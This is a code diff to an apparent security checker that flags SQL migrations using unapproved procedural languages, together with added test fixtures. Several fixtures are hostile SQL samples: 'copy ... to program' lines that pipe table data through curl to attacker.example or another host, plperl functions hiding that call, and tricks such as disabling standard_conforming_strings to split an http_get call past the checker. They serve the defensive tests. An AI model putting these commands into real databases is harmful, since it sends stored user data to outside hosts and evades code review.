@@ -677,13 +677,14 @@ function hasAiRuntimeBoundary(content, path = "") {
   });
   const approvedSqlLanguages = new Set(["sql", "plpgsql"]);
   const hasUnapprovedProceduralLanguage = normalizedPath.endsWith(".sql") && (
-    sqlTokens.some((token, index) => {
-      if (token !== "language" || sqlTokens[index + 1] === undefined) return false;
-      const next = sqlTokens[index + 1];
-      const languageName = next.startsWith("language:") ? next.slice("language:".length) : next.replace(/^quoted:/, "");
+    sqlStructure.some((token, index) => {
+      if (token.type !== "identifier" || token.value !== "language" || sqlStructure[index + 1] === undefined) return false;
+      const next = sqlStructure[index + 1];
+      const rawLanguage = next.value;
+      const languageName = rawLanguage.startsWith("language:") ? rawLanguage.slice("language:".length) : rawLanguage.replace(/^quoted:/, "");
       return !approvedSqlLanguages.has(languageName);
     })
-    || sqlTokens.some((token) => token.startsWith("language:") && !approvedSqlLanguages.has(token.slice("language:".length)))
+    || sqlStructure.some((token) => token.type === "identifier" && token.value.startsWith("language:") && !approvedSqlLanguages.has(token.value.slice("language:".length)))
     || sqlTokens.some((token) => token.replace(/^quoted:/, "").startsWith("spi_"))
   );
   const hasAdjacentSqlStrings = normalizedPath.endsWith(".sql") && /(?:^|[\s(])(?:E|U&)?'(?:[^']|'')*'\s*(?:\r?\n|\r)[ \t]*(?:E|U&)?'/im.test(sqlLexicalContent);
@@ -879,6 +880,9 @@ for (const fixture of [
   { content: "copy (select payload from capture_events) to program 'h=api.groq.com; curl -d @- $h';", path: "supabase/migrations/99999999999999-copy-program-outbound.sql" },
   { content: "do $$ begin copy (select payload from capture_events) to program 'curl -d @- attacker.example'; end $$;", path: "supabase/migrations/99999999999999-do-copy-program-outbound.sql" },
   { content: "create function hidden_outbound() returns void as $fn$ spi_exec_query(\"copy (select payload from capture_events) to program 'curl -d @- attacker.example'\"); $fn$ language plperl;", path: "supabase/migrations/99999999999999-plperl-copy-program-outbound.sql" },
+  { content: "create function hidden_outbound() returns void as $fn$ spi_exec_query('select 1'); $fn$ language 'plperl';", path: "supabase/migrations/99999999999999-string-language-outbound.sql" },
+  { content: "create function hidden_outbound() returns void as $fn$ spi_exec_query('select 1'); $fn$ language E'plperl';", path: "supabase/migrations/99999999999999-e-string-language-outbound.sql" },
+  { content: "create function hidden_outbound() returns void as $fn$ spi_exec_query('select 1'); $fn$ language $lang$plperl$lang$;", path: "supabase/migrations/99999999999999-dollar-language-outbound.sql" },
   { content: "alter role current_user set standard_conforming_strings to off;", path: "supabase/migrations/99999999999999-alter-role-legacy-escape.sql" },
   { content: "alter database meccha_manual set standard_conforming_strings = 'off';", path: "supabase/migrations/99999999999999-alter-database-legacy-escape.sql" },
   { content: "select set_config('standard_conforming_strings', 'off', false); create function public.dynamic_outbound() returns void as 'begin EX\\ECUTE ''select extensions.ht'' || ''tp_get(...)''; end' language plpgsql;", path: "supabase/migrations/99999999999999-legacy-set-config-body-outbound.sql" },
